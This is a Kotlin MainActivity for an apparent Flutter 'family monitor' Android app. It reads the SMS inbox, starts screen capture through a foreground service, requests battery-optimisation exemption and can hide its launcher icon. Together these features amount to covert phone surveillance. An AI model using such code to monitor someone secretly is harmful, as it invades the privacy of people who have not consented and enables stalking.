package com.example.family_monitor

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {
    private val SMS_CHANNEL    = "family_monitor/sms"
    private val SCREEN_CHANNEL = "family_monitor/screen_capture"
    private val REQUEST_MEDIA_PROJECTION = 1001
    private val REQUEST_BATTERY_EXEMPT   = 1002
    private var pendingScreenResult: MethodChannel.Result? = null

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, SMS_CHANNEL)
            .setMethodCallHandler { call, result ->
                if (call.method == "readSms") result.success(readSms(call.argument<Int>("limit") ?: 100))
                else result.notImplemented()
            }
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, SCREEN_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "requestScreenCapture" -> {
                        if (pendingScreenResult != null) { result.error("ALREADY_PENDING", "Already in progress", null); return@setMethodCallHandler }
                        pendingScreenResult = result
                        val pm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                        startActivityForResult(pm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
                    }
                    "stopScreenCaptureService" -> {
                        startService(Intent(this, ScreenCaptureService::class.java).apply { action = ScreenCaptureService.ACTION_STOP })
                        result.success(true)
                    }
                    "requestBatteryOptimizationExemption" -> {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            val pm = getSystemService(PowerManager::class.java)
                            if (!pm.isIgnoringBatteryOptimizations(packageName))
                                startActivityForResult(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")), REQUEST_BATTERY_EXEMPT)
                        }
                        result.success(true)
                    }
                    "isBatteryOptimizationExempt" -> {
                        result.success(if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                            getSystemService(PowerManager::class.java).isIgnoringBatteryOptimizations(packageName) else true)
                    }
                    "hideLauncherIcon" -> {
                        try {
                            packageManager.setComponentEnabledSetting(android.content.ComponentName(this, "${packageName}.MainActivity"),
                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
                            result.success(true)
                        } catch (e: Exception) { result.error("HIDE_FAILED", e.message, null) }
                    }
                    "showLauncherIcon" -> {
                        try {
                            packageManager.setComponentEnabledSetting(android.content.ComponentName(this, "${packageName}.MainActivity"),
                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
                            result.success(true)
                        } catch (e: Exception) { result.error("SHOW_FAILED", e.message, null) }
                    }
                    else -> result.notImplemented()
                }
            }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_MEDIA_PROJECTION) {
            val pending = pendingScreenResult; pendingScreenResult = null
            if (resultCode == Activity.RESULT_OK && data != null) {
                val svc = Intent(this, ScreenCaptureService::class.java).apply {
                    action = ScreenCaptureService.ACTION_START
                    putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode)
                    putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc) else startService(svc)
                pending?.success(mapOf("granted" to true, "resultCode" to resultCode))
            } else { pending?.success(mapOf("granted" to false, "resultCode" to resultCode)) }
        }
    }

    private fun readSms(limit: Int): List<Map<String, Any>> {
        val msgs = mutableListOf<Map<String, Any>>()
        try {
            val cursor = contentResolver.query(Uri.parse("content://sms"), arrayOf("address","body","date","type"), null, null, "date DESC LIMIT $limit")
            cursor?.use { val ai=it.getColumnIndex("address"); val bi=it.getColumnIndex("body"); val di=it.getColumnIndex("date"); val ti=it.getColumnIndex("type")
                while (it.moveToNext()) msgs.add(mapOf("address" to (it.getString(ai)?:""), "body" to (it.getString(bi)?:""), "date" to it.getLong(di), "type" to it.getInt(ti))) }
        } catch (_: Exception) {}
        return msgs
    }
}
